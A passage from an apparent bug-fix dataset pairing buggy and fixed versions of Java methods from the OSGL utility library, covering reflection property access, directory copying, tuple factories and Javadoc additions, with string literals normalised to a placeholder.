    Field f=c.getDeclaredField(propName);
    f.setAccessible(true);
    return newSetter(c,null,f);
  }
 catch (  NoSuchFieldException e) {
    throw E.unexpected(e,""String_Node_Str"",propName,c);
  }
}","@Override public PropertySetter createPropertySetter(Class c,String propName){
  String p=S.capFirst(propName);
  String setter=""String_Node_Str"" + p;
  String isser=""String_Node_Str"" + p;
  Method[] ma=c.getMethods();
  for (  Method m : ma) {
    String mn=m.getName();
    if (S.neq(setter,mn) && S.neq(isser,mn) && S.neq(p,mn)) {
      continue;
    }
    Class[] ca=m.getParameterTypes();
    if (ca != null && ca.length == 1) {
      return newSetter(c,m,null);
    }
  }
  return setterViaField(c,propName);
}"
91556,"@Override public Object get(Object entity,Object index){
  List list=(List)entity;
  int id=-1;
  if (index instanceof Integer) {
    id=(Integer)index;
  }
 else {
    String s=S.string(index);
    if (S.notBlank(s)) {
      id=Integer.parseInt(s);
    }
  }
  Object val=null;
  if (id > -1 && id <= list.size()) {
    val=list.get(id);
  }
  if (null == val) {
switch (nullValuePolicy) {
case NPE:
      throw new NullPointerException();
case CREATE_NEW:
    val=objectFactory.apply(itemType);
  if (id < 0) {
    list.add(val);
  }
 else   if (id >= list.size()) {
    for (int i=list.size(); i < id - 1; ++i) {
      list.add(null);
    }
    list.add(val);
  }
 else {
    list.set(id,val);
  }
default :
}
}
return val;
}","@Override public Object get(Object entity,Object index){
  List list=(List)entity;
  int id=-1;
  if (index instanceof Integer) {
    id=(Integer)index;
  }
 else {
    String s=S.string(index);
    if (S.notBlank(s)) {
      id=Integer.parseInt(s);
    }
  }
  Object val=null;
  if (id > -1 && id < list.size()) {
    val=list.get(id);
  }
  if (null == val) {
switch (nullValuePolicy) {
case NPE:
      throw new NullPointerException();
case CREATE_NEW:
    val=objectFactory.apply(itemType);
  if (id < 0) {
    list.add(val);
  }
 else   if (id >= list.size()) {
    for (int i=list.size(); i < id - 1; ++i) {
      list.add(null);
    }
    list.add(val);
  }
 else {
    list.set(id,val);
  }
default :
}
}
return val;
}"
91557,"ReflectionPropertyGetter(NullValuePolicy nullValuePolicy,Class entityClass,Method m,Field f){
  super(nullValuePolicy,entityClass,m,f);
}","public ReflectionPropertyGetter(NullValuePolicy nullValuePolicy,Class entityClass,Method m,Field f){
  super(nullValuePolicy,entityClass,m,f);
}"
91558,"@Override public PropertySetter setter(){
  return new ReflectionPropertySetter(entityClass,m,f);
}","@Override public PropertySetter setter(){
  String prop;
  if (null != m) {
    prop=m.getName();
    if (prop.startsWith(""String_Node_Str"")) {
      prop=prop.substring(3);
    }
  }
 else {
    prop=f.getName();
  }
  return factory.createPropertySetter(entityClass,prop);
}"
91559,"protected PropertyGetter newGetter(Class c,Method m,Field f){
  return new ReflectionPropertyGetter(c,m,f);
}","protected PropertyGetter newGetter(Class c,Method m,Field f){
  return new ReflectionPropertyGetter(c,m,f,this);
}"
91560,"ReflectionPropertySetter(Osgl.Function<Class<?>,Object> objectFactory,Osgl.Func2<String,Class<?>,?> stringValueResolver,Class entityClass,Method m,Field f){
  super(objectFactory,stringValueResolver,PropertyGetter.NullValuePolicy.CREATE_NEW,entityClass,m,f);
}","public ReflectionPropertySetter(Osgl.Function<Class<?>,Object> objectFactory,Osgl.Func2<String,Class<?>,?> stringValueResolver,Class entityClass,Method m,Field f){
  super(objectFactory,stringValueResolver,PropertyGetter.NullValuePolicy.CREATE_NEW,entityClass,m,f);
}"
91561,"@Override public boolean equals(Object obj){
  if (obj == this) {
    return true;
  }
  if (obj instanceof Option) {
    Option that=(Option)obj;
    return eq(get(),that.get());
  }
  return false;
}","@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (o instanceof Var) {
    Var v=(Var)o;
    return $.eq(v.get(),this.get());
  }
  return false;
}"
91562,"private static List<Class<?>> findPropertyParameterizedType(Object entity,String prop){
  Class<?> c=entity.getClass();
  while (null != c && !Object.class.equals(c)) {
    try {
      String p=S.capFirst(prop);
      String getter=""String_Node_Str"" + p;
      Method m=c.getDeclaredMethod(getter);
      m.setAccessible(true);
      Type type=m.getGenericReturnType();
      if (type instanceof ParameterizedType) {
        ParameterizedType ptype=cast(type);
        return findArgumentTypes(ptype);
      }
    }
 catch (    NoSuchMethodException e) {
      try {
        Method m=c.getDeclaredMethod(prop);
        m.setAccessible(true);
        Type type=m.getGenericReturnType();
        if (type instanceof ParameterizedType) {
          ParameterizedType ptype=cast(type);
          return findArgumentTypes(ptype);
        }
      }
 catch (      NoSuchMethodException e1) {
        try {
          Field f=c.getDeclaredField(prop);
          f.setAccessible(true);
          Type type=f.getGenericType();
          if (type instanceof ParameterizedType) {
            ParameterizedType ptype=cast(type);
            return findArgumentTypes(ptype);
          }
        }
 catch (        NoSuchFieldException e2) {
          c=c.getSuperclass();
        }
      }
    }
  }
  throw E.unexpected(""String_Node_Str"",prop,entity.getClass());
}","private static List<Class<?>> findPropertyParameterizedType(Object entity,String prop){
  Class<?> c=entity.getClass();
  while (null != c && !Object.class.equals(c)) {
    try {
      String p=S.capFirst(prop);
      String getter=""String_Node_Str"" + p;
      Method m=c.getDeclaredMethod(getter);
      m.setAccessible(true);
      Type type=m.getGenericReturnType();
      if (type instanceof ParameterizedType) {
        ParameterizedType ptype=cast(type);
        return findArgumentTypes(ptype);
      }
 else {
        return null;
      }
    }
 catch (    NoSuchMethodException e) {
      try {
        Method m=c.getDeclaredMethod(prop);
        m.setAccessible(true);
        Type type=m.getGenericReturnType();
        if (type instanceof ParameterizedType) {
          ParameterizedType ptype=cast(type);
          return findArgumentTypes(ptype);
        }
      }
 catch (      NoSuchMethodException e1) {
        try {
          Field f=c.getDeclaredField(prop);
          f.setAccessible(true);
          Type type=f.getGenericType();
          if (type instanceof ParameterizedType) {
            ParameterizedType ptype=cast(type);
            return findArgumentTypes(ptype);
          }
        }
 catch (        NoSuchFieldException e2) {
          c=c.getSuperclass();
        }
      }
    }
  }
  throw E.unexpected(""String_Node_Str"",prop,entity.getClass());
}"
91563,"private static <T>T getProperty(CacheService cache,Object entity,String... propertyPath){
  if (null == entity) {
    return null;
  }
  int len=propertyPath.length;
  E.illegalArgumentIf(len < 1);
  Object lastEntity=null;
  for (int i=0; i < len; ++i) {
    String prop=propertyPath[i];
    String lastProp=i == 0 ? prop : propertyPath[i - 1];
    if (entity instanceof List) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      ListPropertyGetter getter=propertyHandlerFactory.createListPropertyGetter(classList.get(0));
      lastEntity=entity;
      entity=getter.get(lastEntity,prop);
    }
 else     if (entity instanceof Map) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      MapPropertyGetter getter=propertyHandlerFactory.createMapPropertyGetter(classList.get(0),classList.get(1));
      lastEntity=entity;
      entity=getter.get(lastEntity,prop);
    }
 else {
      PropertyGetter getter=propertyGetter(cache,entity,prop,false);
      lastEntity=entity;
      entity=getter.get(entity,null);
    }
    if (null == entity) {
      return null;
    }
  }
  return (T)entity;
}","private static <T>T getProperty(CacheService cache,Object entity,String... propertyPath){
  if (null == entity) {
    return null;
  }
  int len=propertyPath.length;
  E.illegalArgumentIf(len < 1);
  Object lastEntity=null;
  for (int i=0; i < len; ++i) {
    String prop=propertyPath[i];
    String lastProp=i == 0 ? prop : propertyPath[i - 1];
    if (entity instanceof List) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      ListPropertyGetter getter=propertyHandlerFactory.createListPropertyGetter(classList.get(0));
      lastEntity=entity;
      entity=getter.get(lastEntity,prop);
    }
 else     if (entity instanceof Map) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      if (null == classList) {
        PropertyGetter getter=propertyGetter(cache,entity,prop,false);
        lastEntity=entity;
        entity=getter.get(entity,null);
      }
 else {
        MapPropertyGetter getter=propertyHandlerFactory.createMapPropertyGetter(classList.get(0),classList.get(1));
        lastEntity=entity;
        entity=getter.get(lastEntity,prop);
      }
    }
 else {
      PropertyGetter getter=propertyGetter(cache,entity,prop,false);
      lastEntity=entity;
      entity=getter.get(entity,null);
    }
    if (null == entity) {
      return null;
    }
  }
  return (T)entity;
}"
91564,"public C.Set<T> toSet(){
  checkState();
  return (C.Set<T>)ImmutableSet.of(buf);
}","public C.Set<T> toSet(){
  checkState();
  trimToSize();
  Object[] data=buf;
  buf=null;
  return (C.Set<T>)ImmutableSet.of(data);
}"
91565,"public static void copyDirectory(File source,File target){
  if (source.isDirectory()) {
    if (!target.exists()) {
      target.mkdir();
    }
    for (    String child : source.list()) {
      copyDirectory(new File(source,child),new File(target,child));
    }
  }
 else {
    try {
      write(new FileInputStream(source),new FileOutputStream(target));
    }
 catch (    IOException e) {
      throw E.ioException(e);
    }
  }
}","public static void copyDirectory(File source,File target){
  if (source.isDirectory()) {
    if (!target.exists()) {
      target.mkdir();
    }
    for (    String child : source.list()) {
      copyDirectory(new File(source,child),new File(target,child));
    }
  }
 else {
    try {
      write(new FileInputStream(source),new FileOutputStream(target));
    }
 catch (    IOException e) {
      if (target.isDirectory()) {
        if (!target.exists()) {
          if (!target.mkdirs()) {
            throw E.ioException(""String_Node_Str"",source,target);
          }
        }
        target=new File(target,source.getName());
      }
 else {
        File targetFolder=target.getParentFile();
        if (!targetFolder.exists()) {
          if (!targetFolder.mkdirs()) {
            throw E.ioException(""String_Node_Str"",source,target);
          }
        }
      }
      try {
        write(new FileInputStream(source),new FileOutputStream(target));
      }
 catch (      IOException e0) {
        throw E.ioException(e0);
      }
    }
  }
}"
91566,"protected $(){
}","private $(){
}"
91567,"/** 
 * Convert a <code>Function&lt;T, Boolean&gt;</code> typed function to  {@link Osgl.Predicate Predicate&lt;T&gt;} function.<p>If the function specified is already a  {@link Predicate}, then the function itself is returned</p>
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> predicate(final Function<? super T,Boolean> f1){
  if (f1 instanceof Predicate) {
    return (Predicate<T>)f1;
  }
  return new Predicate<T>(){
    @Override public boolean test(    T t){
      return f1.apply(t);
    }
  }
;
}","/** 
 * Convert a <code>Function&lt;T, Boolean&gt;</code> typed function to  {@link Osgl.Predicate Predicate&lt;T&gt;} function.<p>If the function specified is already a  {@link Predicate}, then the function itself is returned</p>
 * @param f   the function to be converted
 * @param < T > the argument type
 * @return a function of {@link Predicate} type that is equivalent to function {@code f}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> predicate(final Function<? super T,Boolean> f){
  if (f instanceof Predicate) {
    return (Predicate<T>)f;
  }
  return new Predicate<T>(){
    @Override public boolean test(    T t){
      return f.apply(t);
    }
  }
;
}"
91568,"/** 
 * Return a five variables function that throw out a   {@link Break} when the predicate returns<code>true</code> on an element been tested. There is no payload specified and the <code>Break</code> will use test result i.e. <code>true</code> as the payload
 * @param predicate the predicate function that takes five arguments and returns a {@code boolean} type value
 * @param < T1 > the generic type of the argument 1
 * @param < T2 > the generic type of the argument 2
 * @param < T3 > the generic type of the argument 3
 * @param < T4 > the generic type of the argument 4
 * @param < T4 > the generic type of the argument 5
 * @return a function that check on five arguments and throw out {@code true} if the check returns {@code true}
 * @since 0.2
 */
public static <T1,T2,T3,T4,T5>F5<T1,T2,T3,T4,T5,Void> breakIf(final Func5<? super T1,? super T2,? super T3,? super T4,? super T5,Boolean> predicate){
  return new F5<T1,T2,T3,T4,T5,Void>(){
    @Override public Void apply(    T1 t1,    T2 t2,    T3 t3,    T4 t4,    T5 t5){
      if (predicate.apply(t1,t2,t3,t4,t5)) {
        throw breakOut(true);
      }
      return null;
    }
  }
;
}","/** 
 * Return a five variables function that throw out a   {@link Break} when the predicate returns<code>true</code> on an element been tested. There is no payload specified and the <code>Break</code> will use test result i.e. <code>true</code> as the payload
 * @param predicate the predicate function that takes five arguments and returns a {@code boolean} type value
 * @param < T1 >      the generic type of the argument 1
 * @param < T2 >      the generic type of the argument 2
 * @param < T3 >      the generic type of the argument 3
 * @param < T4 >      the generic type of the argument 4
 * @param < T5 >      the generic type of the argument 5
 * @return a function that check on five arguments and throw out {@code true} if the check returns {@code true}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T1,T2,T3,T4,T5>F5<T1,T2,T3,T4,T5,Void> breakIf(final Func5<? super T1,? super T2,? super T3,? super T4,? super T5,Boolean> predicate){
  return new F5<T1,T2,T3,T4,T5,Void>(){
    @Override public Void apply(    T1 t1,    T2 t2,    T3 t3,    T4 t4,    T5 t5){
      if (predicate.apply(t1,t2,t3,t4,t5)) {
        throw breakOut(true);
      }
      return null;
    }
  }
;
}"
91569,"/** 
 * The type-safe version of   {@link #NOT_NULL}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> notNull(){
  return NOT_NULL;
}","@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <T>Predicate<T> notNull(){
  return NOT_NULL;
}"
91570,"/** 
 * Alias of   {@link #gte(java.util.Comparator)}
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> greaterThanOrEqualsTo(final Func2<? super T,? super T,Integer> c){
  return gte(c);
}","/** 
 * Alias of   {@link #gte(java.util.Comparator)}
 * @param < T > The type of the value been compared, should implements {@link Comparable}
 * @param c   The comparator that can compare the value
 * @return the function that do the comparison
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> greaterThanOrEqualsTo(final Func2<? super T,? super T,Integer> c){
  return gte(c);
}"
91571,"/** 
 * Check if any objects in the parameter list is null
 */
public static boolean anyNull(Object o,Object... oa){
  if (!isNull(o))   return true;
  for (int i=oa.length - 1; i >= 0; --i) {
    if (!isNull(oa[i]))     return true;
  }
  return false;
}","/** 
 * Check if any objects in the parameter list is null
 * @param o  the first object to be checked
 * @param oa the array of objects to be checked
 * @return {@code true} if any one of the argument is {@code null}
 */
public static boolean anyNull(Object o,Object... oa){
  if (!isNull(o))   return true;
  for (int i=oa.length - 1; i >= 0; --i) {
    if (!isNull(oa[i]))     return true;
  }
  return false;
}"
91572,"public Map<A,B> asMap(){
  Map<A,B> m=new HashMap<A,B>();
  m.put(_1,_2);
  return m;
}","@SuppressWarnings(""String_Node_Str"") public Map<A,B> asMap(){
  Map<A,B> m=new HashMap<A,B>();
  m.put(_1,_2);
  return m;
}"
91573,"/** 
 * See <a href=""http://download.java.net/jdk8/docs/api/java/util/Comparator.html#thenComparing(java.util.function.Function)"">Java 8 doc</a>
 * @param keyExtractor the function that extract key of type U from instance of type T
 * @param < U > the key type
 * @return a comparator that applied if the result of this comparator is even
 */
public <U extends Comparable<? super U>>Comparator<T> thenComparing(Function<? super T,? extends U> keyExtractor){
  return thenComparing(Osgl.F.comparing(keyExtractor));
}","/** 
 * See <a href=""http://download.java.net/jdk8/docs/api/java/util/Comparator.html#thenComparing(java.util.function.Function)"">Java 8 doc</a>
 * @param keyExtractor the function that extract key of type U from instance of type T
 * @param < U >          the key type
 * @return a comparator that applied if the result of this comparator is even
 */
public <U extends Comparable<? super U>>Comparator<T> thenComparing(Function<? super T,? extends U> keyExtractor){
  return thenComparing(Osgl.F.comparing(keyExtractor));
}"
91574,"/** 
 * Alias of   {@link #lt(java.util.Comparator)}
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> lessThan(final Func2<? super T,? super T,Integer> c){
  return lt(c);
}","/** 
 * Alias of   {@link #lt(java.util.Comparator)}
 * @param c   a comparator function
 * @param < T > the element type
 * @return a function that use function {@code c} to check if an element is lesser than another
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> lessThan(final Func2<? super T,? super T,Integer> c){
  return lt(c);
}"
91575,"public static <A,B>T2<A,B> T2(A a,B b){
  return new T2(a,b);
}","public static <A,B>T2<A,B> T2(A a,B b){
  return new T2<A,B>(a,b);
}"
91576,"public static <A,B,C>T3<A,B,C> T3(A a,B b,C c){
  return new T3(a,b,c);
}","public static <A,B,C>T3<A,B,C> T3(A a,B b,C c){
  return new T3<A,B,C>(a,b,c);
}"
91577,"public static <A,B,C,D>T4<A,B,C,D> T4(A a,B b,C c,D d){
  return new T4<A,B,C,D>(a,b,c,d);
}","@SuppressWarnings(""String_Node_Str"") public static <A,B,C,D>T4<A,B,C,D> T4(A a,B b,C c,D d){
  return new T4<A,B,C,D>(a,b,c,d);
}"
91578,"public static <A,B,C,D,E>T5<A,B,C,D,E> T5(A a,B b,C c,D d,E e){
  return new T5<A,B,C,D,E>(a,b,c,d,e);
}","@SuppressWarnings(""String_Node_Str"") public static <A,B,C,D,E>T5<A,B,C,D,E> T5(A a,B b,C c,D d,E e){
  return new T5<A,B,C,D,E>(a,b,c,d,e);
}"
91579,"/** 
 * Returns a function that when applied, run   {@link Osgl.Option#orElse(Osgl.Func0)}on this   {@code Option}
 */
public final <B>F0<T> orElse(final Func0<? extends T> other){
  return new F0<T>(){
    @Override public T apply() throws NotAppliedException, Break {
      return Option.this.orElse(other);
    }
  }
;
}","/** 
 * Returns a function that when applied, run   {@link Osgl.Option#orElse(Osgl.Func0)}on this   {@code Option}
 * @param other the function that generates another {@code T} element when thisoption is empty
 * @return the function that implement the {@code else if} semantic on this Option
 */
@SuppressWarnings(""String_Node_Str"") public final F0<T> orElse(final Func0<? extends T> other){
  return new F0<T>(){
    @Override public T apply() throws NotAppliedException, Break {
      return Option.this.orElse(other);
    }
  }
;
}"
91580,"/** 
 * The type-safe version of   {@link #IS_NULL}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> isNull(Class<T> c){
  return IS_NULL;
}","@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <T>Predicate<T> isNull(Class<T> c){
  return IS_NULL;
}"
91581,"/** 
 * Returns String representation of an object instance. Predicate the object specified is   {@code null} or {@code Osgl.NONE}, then an empty string is returned
 * @param o
 * @return a String representation of object
 */
public static String toString(Object o){
  if (isNull(o)) {
    return ""String_Node_Str"";
  }
  return o.toString();
}","/** 
 * Returns String representation of an object instance. Predicate the object specified is   {@code null} or {@code Osgl.NONE}, then an empty string is returned
 * @param o the object which will be converted into a string
 * @return a String representation of object
 */
public static String toString(Object o){
  if (isNull(o)) {
    return ""String_Node_Str"";
  }
  return o.toString();
}"
91582,"/** 
 * Convert a general   {@link Osgl.Func0} typed function to {@link F0} type
 * @param f0 a function of type {@link Func0} that returns type R value
 * @param < R > the generic type of the return value when applying function f0
 * @return a {@link F0} type that is equaivlent to function f0
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <R>F0<R> f0(final Func0<? extends R> f0){
  E.NPE(f0);
  if (f0 instanceof F0) {
    return (F0<R>)f0;
  }
  return new F0<R>(){
    @Override public R apply(){
      return f0.apply();
    }
  }
;
}","/** 
 * Convert a general   {@link Osgl.Func0} typed function to {@link F0} type
 * @param f0  a function of type {@link Func0} that returns type R value
 * @param < R > the generic type of the return value when applying function f0
 * @return a {@link F0} type that is equaivlent to function f0
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <R>F0<R> f0(final Func0<? extends R> f0){
  E.NPE(f0);
  if (f0 instanceof F0) {
    return (F0<R>)f0;
  }
  return new F0<R>(){
    @Override public R apply(){
      return f0.apply();
    }
  }
;
}"
91583,"/** 
 * Convert a general   {@link Osgl.Func2} function into a {@link F2} typedfunction
 * @param < P1 > the type of the first param the new function applied to
 * @param < P2 > the type of the second param the new function applied to
 * @param < R >  the type of new function application result
 * @return a {@code F2} instance corresponding to the specified {@code Func2} instance
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,R>F2<P1,P2,R> f2(final Func2<? super P1,? super P2,? extends R> f2){
  E.NPE(f2);
  if (f2 instanceof F2) {
    return (F2<P1,P2,R>)f2;
  }
  return new F2<P1,P2,R>(){
    @Override public R apply(    P1 p1,    P2 p2){
      return f2.apply(p1,p2);
    }
  }
;
}","/** 
 * Convert a general   {@link Osgl.Func2} function into a {@link F2} typedfunction
 * @param f2   the function that takes two arguments and return type {@code R}
 * @param < P1 > the type of the first param the new function applied to
 * @param < P2 > the type of the second param the new function applied to
 * @param < R >  the type of new function application result
 * @return a {@code F2} instance corresponding to the specified {@code Func2} instance
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,R>F2<P1,P2,R> f2(final Func2<? super P1,? super P2,? extends R> f2){
  E.NPE(f2);
  if (f2 instanceof F2) {
    return (F2<P1,P2,R>)f2;
  }
  return new F2<P1,P2,R>(){
    @Override public R apply(    P1 p1,    P2 p2){
      return f2.apply(p1,p2);
    }
  }
;
}"
91584,"/** 
 * Alias of   {@link org.osgl.util.S#fmt(String,Object)}
 * @since 0.2
 */
public static final String fmt(String tmpl,Object... args){
  return S.fmt(tmpl,args);
}","/** 
 * Alias of   {@link org.osgl.util.S#fmt(String,Object)}
 * @param tmpl the format template
 * @param args the format arguments
 * @return the formatted string
 * @since 0.2
 */
public static String fmt(String tmpl,Object... args){
  return S.fmt(tmpl,args);
}"
91585,"/** 
 * Convert a general   {@link Osgl.Func3} function into a {@link F3} typedfunction
 * @param f3 the general function with three params
 * @return the {@link #F3} typed instance which is equivalent to f3
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,P3,R>F3<P1,P2,P3,R> f3(final Func3<? super P1,? super P2,? super P3,? extends R> f3){
  E.NPE(f3);
  if (f3 instanceof F3) {
    return (F3<P1,P2,P3,R>)f3;
  }
  return new F3<P1,P2,P3,R>(){
    @Override public R apply(    P1 p1,    P2 p2,    P3 p3){
      return f3.apply(p1,p2,p3);
    }
  }
;
}","/** 
 * Convert a general   {@link Osgl.Func3} function into a {@link F3} typedfunction
 * @param f3   the general function with three params
 * @param < P1 > type of argument 1
 * @param < P2 > type of argument 2
 * @param < P3 > type of argument 3
 * @param < R >  return type
 * @return the {@link #F3} typed instance which is equivalent to f3
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,P3,R>F3<P1,P2,P3,R> f3(final Func3<? super P1,? super P2,? super P3,? extends R> f3){
  E.NPE(f3);
  if (f3 instanceof F3) {
    return (F3<P1,P2,P3,R>)f3;
  }
  return new F3<P1,P2,P3,R>(){
    @Override public R apply(    P1 p1,    P2 p2,    P3 p3){
      return f3.apply(p1,p2,p3);
    }
  }
;
}"
91586,"/** 
 * Convert a general   {@link Osgl.Func4} function into a {@link F4} typedfunction
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,P3,P4,R>F4<P1,P2,P3,P4,R> f4(final Func4<? super P1,? super P2,? super P3,? super P4,? extends R> f4){
  E.NPE(f4);
  if (f4 instanceof F4) {
    return (F4<P1,P2,P3,P4,R>)f4;
  }
  return new F4<P1,P2,P3,P4,R>(){
    @Override public R apply(    P1 p1,    P2 p2,    P3 p3,    P4 p4){
      return f4.apply(p1,p2,p3,p4);
    }
  }
;
}","/** 
 * Convert a general   {@link Osgl.Func4} function into a {@link F4} typedfunction
 * @param f4   the function to be converted
 * @param < P1 > type of first argument
 * @param < P2 > type of second argument
 * @param < P3 > type of third argument
 * @param < P4 > type of fourth argument
 * @param < R >  type of return value
 * @return the function of {@link F4} type that is equivalent to function {@code f4}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,P3,P4,R>F4<P1,P2,P3,P4,R> f4(final Func4<? super P1,? super P2,? super P3,? super P4,? extends R> f4){
  E.NPE(f4);
  if (f4 instanceof F4) {
    return (F4<P1,P2,P3,P4,R>)f4;
  }
  return new F4<P1,P2,P3,P4,R>(){
    @Override public R apply(    P1 p1,    P2 p2,    P3 p3,    P4 p4){
      return f4.apply(p1,p2,p3,p4);
    }
  }
;
}"
91587,"/** 
 * Convert a general   {@link Osgl.Func5} function into a {@link F5} typedfunction
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,P3,P4,P5,R>F5<P1,P2,P3,P4,P5,R> f5(final Func5<? super P1,? super P2,? super P3,? super P4,? super P5,? extends R> f5){
  E.NPE(f5);
  if (f5 instanceof F5) {
    return (F5<P1,P2,P3,P4,P5,R>)f5;
  }
  return new F5<P1,P2,P3,P4,P5,R>(){
    @Override public R apply(    P1 p1,    P2 p2,    P3 p3,    P4 p4,    P5 p5){
      return f5.apply(p1,p2,p3,p4,p5);
    }
  }
;
}","/** 
 * Convert a general   {@link Osgl.Func5} function into a {@link F5} typedfunction
 * @param f5   the function to be converted
 * @param < P1 > type of first argument
 * @param < P2 > type of second argument
 * @param < P3 > type of third argument
 * @param < P4 > type of fourth argument
 * @param < P5 > type of fifth argument
 * @param < R >  type of return value
 * @return the function of {@link F5} type that is equivalent to function {@code f5}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2,P3,P4,P5,R>F5<P1,P2,P3,P4,P5,R> f5(final Func5<? super P1,? super P2,? super P3,? super P4,? super P5,? extends R> f5){
  E.NPE(f5);
  if (f5 instanceof F5) {
    return (F5<P1,P2,P3,P4,P5,R>)f5;
  }
  return new F5<P1,P2,P3,P4,P5,R>(){
    @Override public R apply(    P1 p1,    P2 p2,    P3 p3,    P4 p4,    P5 p5){
      return f5.apply(p1,p2,p3,p4,p5);
    }
  }
;
}"
91588,"/** 
 * @param f
 * @param < X >
 * @param < Y >
 * @return
 */
public static <X,Y>Bijection<Y,X> invert(final Bijection<X,Y> f){
  return Osgl.f1(f.invert());
}","/** 
 * Returns a inverted function of   {@link Bijection} which map from X to Y, and thereturned function map from Y to X. This function will call  {@link Bijection#invert()}to get the return function
 * @param f   the bijection function to be inverted
 * @param < X > the argument type, and the result type of the return function
 * @param < Y > the result type, and the argument type of the return function
 * @return the inverted function of input function {@code f}
 */
public static <X,Y>Bijection<Y,X> invert(final Bijection<X,Y> f){
  return Osgl.f1(f.invert());
}"
91589,"/** 
 * Alias of   {@link #ne()}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2>F2<P1,P2,Boolean> notEqual(){
  return NE;
}","@SuppressWarnings({""String_Node_Str"",""String_Node_Str""}) public static <P1,P2>F2<P1,P2,Boolean> notEqual(){
  return NE;
}"
91590,"public static <P>Predicate<P> eq(final P element){
  return new Predicate<P>(){
    @Override public boolean test(    P p){
      return Osgl.eq(p,element);
    }
  }
;
}","/** 
 * Returns a   {@link Predicate} that checkes if the argumentequals to the element specified
 * @param element the object to be checked with argument when applyingthe function
 * @param < P >     the element type
 * @return the function that returns {@code true} if the argument equalswith the element specified or  {@code false} otherwise
 */
public static <P>Predicate<P> eq(final P element){
  return new Predicate<P>(){
    @Override public boolean test(    P p){
      return Osgl.eq(p,element);
    }
  }
;
}"
91591,"/** 
 * A type-safe version of   {@link #TRUE}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> yes(){
  return TRUE;
}","/** 
 * A type-safe version of   {@link #TRUE}
 * @param < T > the argument type
 * @return a function that always returns {@code true}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <T>Predicate<T> yes(){
  return TRUE;
}"
91592,"/** 
 * Alias of   {@link #eq()}
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2>F2<P1,P2,Boolean> equal(){
  return EQ;
}","/** 
 * Alias of   {@link #eq()}
 * @param < P1 > the type of the first argument
 * @param < P2 > the type of the second argument
 * @return a type-safe function that check equility of two objects
 * @since 0.2
 */
@SuppressWarnings(""String_Node_Str"") public static <P1,P2>F2<P1,P2,Boolean> equal(){
  return EQ;
}"
91593,"/** 
 * Alias of   {@link #lte(java.util.Comparator)}
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> lessThanOrEqualsTo(final Func2<? super T,? super T,Integer> c){
  return lte(c);
}","/** 
 * Alias of   {@link #lte(java.util.Comparator)}
 * @param < T > The type of the value been compared, should implements {@link Comparable}
 * @param c   The comparator that can compare the value
 * @return the function that do the comparison
 * @since 0.2
 */
public static <T>F2<T,T,Boolean> lessThanOrEqualsTo(final Func2<? super T,? super T,Integer> c){
  return lte(c);
}"
91594,"/** 
 * Check if two objects are equals to each other. The comparison will do array equal matching if needed
 * @param a
 * @param b
 * @return
 */
public static boolean eq2(Object a,Object b){
  if (eq(a,b))   return true;
  Class<?> ca=a.getClass();
  if (!ca.isArray())   return false;
  Class<?> cb=b.getClass();
  if (ca != cb)   return false;
  if (ca == boolean[].class) {
    return Arrays.equals((boolean[])a,(boolean[])b);
  }
 else   if (ca == byte[].class) {
    return Arrays.equals((byte[])a,(byte[])b);
  }
 else   if (ca == int[].class) {
    return Arrays.equals((int[])a,(int[])b);
  }
 else   if (ca == char[].class) {
    return Arrays.equals((char[])a,(char[])b);
  }
 else   if (ca == long[].class) {
    return Arrays.equals((long[])a,(long[])b);
  }
 else   if (ca == float[].class) {
    return Arrays.equals((float[])a,(float[])b);
  }
 else   if (ca == double[].class) {
    return Arrays.equals((double[])a,(double[])b);
  }
 else   if (ca == short[].class) {
    return Arrays.equals((short[])a,(short[])b);
  }
 else {
    return Arrays.equals((Object[])a,(Object[])b);
  }
}","/** 
 * Check if two objects are equals to each other. The comparison will do array equal matching if needed
 * @param a the first object
 * @param b the second object
 * @return {@code true} if the first object equals to the second object
 */
public static boolean eq2(Object a,Object b){
  if (eq(a,b))   return true;
  Class<?> ca=a.getClass();
  if (!ca.isArray())   return false;
  Class<?> cb=b.getClass();
  if (ca != cb)   return false;
  if (ca == boolean[].class) {
    return Arrays.equals((boolean[])a,(boolean[])b);
  }
 else   if (ca == byte[].class) {
    return Arrays.equals((byte[])a,(byte[])b);
  }
 else   if (ca == int[].class) {
    return Arrays.equals((int[])a,(int[])b);
  }
 else   if (ca == char[].class) {
    return Arrays.equals((char[])a,(char[])b);
  }
 else   if (ca == long[].class) {
    return Arrays.equals((long[])a,(long[])b);
  }
